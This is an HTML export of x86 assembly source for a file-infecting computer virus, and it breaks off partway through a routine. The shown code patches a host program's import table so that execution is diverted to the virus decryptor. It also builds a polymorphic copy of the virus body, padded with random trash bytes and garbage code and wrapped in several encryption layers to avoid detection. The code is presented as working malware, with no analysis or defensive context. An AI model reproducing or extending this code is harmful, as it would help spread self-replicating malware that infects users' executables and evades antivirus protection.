<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">                </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">vars</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                prepare EPO patch                      ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;                </span><span class="sc0">
</span><span class="sc5">do_epo_patch_2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.epo_do_direct_call</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; default (relative call)</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_epo_patch_now</span><span class="sc0"> </span><span class="sc1">;DEBUG !!!</span><span class="sc0">
                </span><span class="sc1">; find import table</span><span class="sc0">
                    
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrMappedImage</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">; IMAGE_NT_HEADER</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; characteristics </span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_epo_patch_now</span><span class="sc0"> </span><span class="sc1">; image can be relocated , mem32 patch cannot be used </span><span class="sc0">
                    
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                    </span><span class="sc1">; sizeof image_nt_header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">104</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; rva import table</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RvaToRaw</span><span class="sc0"> 
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_epo_patch_now</span><span class="sc0">
 
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">108</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; it size</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; tasm/masm images have incorrect IT size in dir </span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">do_epo_patch_now</span><span class="sc0">
                    
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">108</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; increase it size </span><span class="sc0">
                
                </span><span class="sc1">; put dword ptr behind it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.decryptor_ep_VA</span><span class="sc0">  
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> 
                
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RawToVa</span><span class="sc0">
                </span><span class="sc1">; set epo to point to this address </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.decryptor_ep_VA</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">  
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.epo_do_direct_call</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> 
                
</span><span class="sc5">do_epo_patch_now</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">epo</span><span class="sc0"> 
                    
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  
                </span><span class="sc6">retn</span><span class="sc0">
                    
                    
</span><span class="sc1">;---------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;           Prepare crypted copy of virus to buffer                 ;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------;                   </span><span class="sc0">
</span><span class="sc1">; edx = virus buffer base VA                    </span><span class="sc0">
</span><span class="sc5">polymorph_virus</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.virus_state_flags</span><span class="sc4">,-</span><span class="sc2">2</span><span class="sc0">
                
                </span><span class="sc1">; allocate buffer </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VIRUS_MEM_ALLOC_SIZE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocateMem</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">PrepareFail</span><span class="sc1">; alloc error </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                    
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;  Allocate poly_vars struct on stack  ;</span><span class="sc0">
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc0"> </span><span class="sc9">sizeof</span><span class="sc0"> </span><span class="sc5">poly_vars</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc10">@b</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                
                </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">poly_vars</span><span class="sc0">
                    
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;    Set poly junk mem reads dest      ;</span><span class="sc0">
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">; junk accesses are not keen on fixed memory location</span><span class="sc0">
                </span><span class="sc1">; because delta_offset is used</span><span class="sc0">
                
                </span><span class="sc1">; setup junk mem accesses to .data </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.number_of_sect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; more than one section ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_sect_headers</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">  </span><span class="sc1">;sizeof section_header </span><span class="sc0">
                
                </span><span class="sc1">; assume that second section is data</span><span class="sc0">
                </span><span class="sc1">; even wrong assumtion will not cause error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; virtual size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0"> 
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_read_mem_size</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;eax </span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; virtual address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; image base </span><span class="sc0">
                 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_read_mem_base</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;eax</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">             
                
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;    Gen trash before virus        ;</span><span class="sc0">
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">; generate random amount of trash bytes                 </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
</span><span class="sc1">; generate trash loop 1                 </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VIRUS_TRASH_BYTES_MAX</span><span class="sc0"> 
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0"> 
                 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">  
</span><span class="sc5">trash_loop_1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">trash_loop_1</span><span class="sc0">    
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;----------------------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;   generate garbage code here before the virus ep   ;</span><span class="sc0">
                </span><span class="sc1">;----------------------------------------------------;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; poly decryptor va</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base_va</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_garbage_level</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_options</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;POLY_OPT_POS_INDEPENDENT ;OR POLY_OPT_USE_SUBROUTINES</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">; garbage amount </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PolyCreateGarbage</span><span class="sc0">
                    
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;      Copy virus body to buffer       ;</span><span class="sc0">
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.OrigVirusEntryVa</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.VirusEntryVa</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; created garbage size  </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;        Gen trash after virus         ;</span><span class="sc0">
                </span><span class="sc1">;--------------------------------------;                    </span><span class="sc0">
                </span><span class="sc1">; generate trash loop 2                 </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VIRUS_TRASH_BYTES_MAX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">  
</span><span class="sc5">trash_loop_2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">trash_loop_2</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">                     
                 
                </span><span class="sc1">;--------------------------------------;</span><span class="sc0">
                </span><span class="sc1">;       Prepare poly structure         ;</span><span class="sc0">
                </span><span class="sc1">;--------------------------------------;  </span><span class="sc0">
                </span><span class="sc1">; set code_base va  </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_ptr_code_base_va</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;edx ; edx = virus buffer base VA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc1">; set code_base raw </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_ptr_code_base_raw</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
                    
                </span><span class="sc1">; poly_entry </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.VirusEntryVa</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_code_entry_offset</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; edx = virus buffer base VA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.VirusEntryVa</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                    
                </span><span class="sc1">;  set poly decryptor base raw</span><span class="sc0">
                </span><span class="sc1">;  set base_raw and base_va to same value and poly_options to POS_INDEPENDENT  </span><span class="sc0">
                </span><span class="sc1">;  that will make decryptor fully position independent </span><span class="sc0">
                </span><span class="sc1">;  dont use memory reads/writes in such a case </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_decryptor_base_va</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                    
                </span><span class="sc1">;  count virus size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_code_size</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
                     
                </span><span class="sc1">;  set poly options</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_garbage_level</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.poly_options</span><span class="sc4">,</span><span class="sc5">POLY_OPT_POS_INDEPENDENT</span><span class="sc0">
                    
                </span><span class="sc1">; create N poly layers </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VIRUS_POLY_LAYERS_MAX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                    
</span><span class="sc5">CreateLayer</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> 
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PolyEngine</span><span class="sc0">

                </span><span class="sc1">; set new code entry offset </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
